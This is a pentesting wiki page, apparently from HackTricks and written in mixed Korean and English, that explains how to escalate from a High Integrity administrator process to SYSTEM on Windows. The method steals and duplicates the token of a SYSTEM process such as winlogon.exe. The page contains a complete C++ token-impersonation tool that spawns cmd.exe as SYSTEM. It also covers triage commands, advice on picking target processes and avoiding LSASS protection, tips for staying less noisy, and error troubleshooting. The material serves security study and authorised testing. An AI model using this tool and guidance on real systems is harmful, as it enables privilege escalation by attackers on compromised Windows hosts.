# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 **High Integrity administrator process**에서 시작해 **보호되지 않은 SYSTEM process를 열고, 해당 token을 복제한 뒤, 그 token으로 child process를 생성하는 방식**으로 **`NT AUTHORITY\SYSTEM`**으로 이동하는 **manual** 버전에 대해 설명합니다.

만약 **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**만 가지고 있고 **적절한 SYSTEM process를 열 수 없다면**, **Potato / named-pipe** 경로가 보통 더 신뢰할 수 있습니다:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

원하는 것이 단순히 `SYSTEM`이 아니라 가능한 한 많은 privilege를 가진 **SYSTEM token**이라면, 다음도 확인하세요:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

token을 훔치기 전에, 먼저 context를 빠르게 확인하세요:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Practical notes:

- A **High Integrity** admin token is usually enough to **enable `SeDebugPrivilege`** and open many non-protected SYSTEM processes.
- **`CreateProcessWithTokenW` requires `SeImpersonatePrivilege`** on the caller. If that API fails with `1314`, switch to `CreateProcessAsUserW` after you already duplicated a SYSTEM primary token.
- On modern Windows, **`lsass.exe`** is often a bad target because **LSA protection / PPL** blocks access even for administrators with `SeDebugPrivilege`. Prefer **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, or an early **`svchost.exe`** running as SYSTEM.
- Not every SYSTEM process has an equally useful token. If you get SYSTEM but notice missing privileges, try a different SYSTEM process instead of assuming the technique is broken.

## Pick the PID carefully

The easiest way to make this work reliably is to **choose a SYSTEM process whose DACL actually allows Administrators to query the process and duplicate its token**.

Good candidates to test first:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- some early `svchost.exe` instances running as SYSTEM

Avoid by default:

- `lsass.exe` on hosts where **RunAsPPL / LSA protection** is enabled
- protected / security-sensitive processes that return `Access denied` even after enabling `SeDebugPrivilege`

You can inspect candidate processes and their token/ACLs with **Process Explorer** or **Process Hacker** running elevated.

### Code

The following code from [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). It allows to **indicate a Process ID as argument** and a CMD **running as the user** of the indicated process will be run.\
Running in a High Integrity process you can **indicate the PID of a process running as System** (like `winlogon`, `wininit`) and execute a `cmd.exe` as SYSTEM.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-right notes

샘플은 `MAXIMUM_ALLOWED`를 사용하지만, 실제 작업에서는 관련된 최소 구성 요소를 기억하는 것이 유용합니다:

- `OpenProcessToken()`은 **process handle**이 **`PROCESS_QUERY_LIMITED_INFORMATION`**으로 열려 있기만 하면 됩니다.
- `CreateProcessWithTokenW()`를 사용하려면, **primary token handle**에 **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**가 있어야 합니다.
- `DuplicateTokenEx()`는 impersonation token이 아니라 **primary token**(`TokenPrimary`)을 생성해야 합니다.
- 이미 SYSTEM으로 impersonated 했는데도 `CreateProcessWithTokenW()`가 계속 `1314`로 실패하면, 대신 `CreateProcessAsUserW()`를 시도해 보세요.

즉, **target process를 `PROCESS_ALL_ACCESS`로 여는 것**은 보통 불필요하고, token을 query하는 데 필요한 권한만 요청하는 것보다 더 noisy합니다.

## Error

때때로 System을 impersonate하려고 시도하지만 작동하지 않고, 다음과 같은 output이 표시될 수 있습니다:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
이것은 High Integrity level에서 실행 중이더라도 대상 process/token에 대해 **충분한 permissions가 없다는** 뜻입니다.\
**Process Explorer**(또는 **Process Hacker**도 사용 가능)로 `svchost.exe` processes에 대한 현재 Administrator permissions를 확인해 봅시다:

1. `svchost.exe` process 하나를 선택
2. Right Click --> Properties
3. "Security" Tab 안에서 오른쪽 아래의 "Permissions" 버튼 클릭
4. "Advanced" 클릭
5. "Administrators"를 선택하고 "Edit" 클릭
6. "Show advanced permissions" 클릭

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

이전 이미지는 선택한 process에 대해 "Administrators"가 가진 모든 privileges를 보여줍니다(보시다시피 `svchost.exe`의 경우 "Query" privileges만 가집니다)

`winlogon.exe`에 대해 "Administrators"가 가진 privileges를 보세요:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

그 process 안에서 "Administrators"는 "Read Memory"와 "Read Permissions"를 사용할 수 있으며, 이는 아마도 Administrators가 이 process가 사용하는 token을 impersonate할 수 있게 해줍니다.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: process DACL이 차단했거나, 대상이 **protected/PPL**입니다. 다른 SYSTEM process를 선택하세요.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: token handle을 충분한 rights 없이 열었거나, 대상 token DACL이 duplication을 막고 있습니다.
- **`CreateProcessWithTokenW()` -> `1314`**: 호출자가 현재 **`SeImpersonatePrivilege`**를 활성화하지 못했습니다. 먼저 활성화해 보거나 duplicated primary token으로 `CreateProcessAsUserW()`를 사용하세요.
- **`CreateProcessWithTokenW()` -> `1326`** 이전 실패 이후: 보통 앞선 token duplication/impersonation 단계가 실패했다는 뜻이며, 따라서 자식 process를 실행할 usable primary token이 없습니다.

## Operator notes

- 이 technique는 이미 **local admin + high integrity** 상태일 때, service를 만들거나 named-pipe coercion chain을 돌리지 않고도 SYSTEM으로 가는 빠르고 수동적인 경로가 필요할 때 좋습니다.
- 강화된 Windows 11 / Server 환경에서는 **LSA protection**이 점점 더 흔해지고 있으므로, `lsass.exe`가 항상 readable하다고 가정하는 workflow는 취약합니다. **`winlogon.exe` / `wininit.exe` / `services.exe`가 보통 더 나은 첫 선택**입니다.
- **elevated admin desktop**이 아니라 **service account** context에 들어가 있다면, 이 page보다 **Potato family**가 보통 더 적합합니다.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
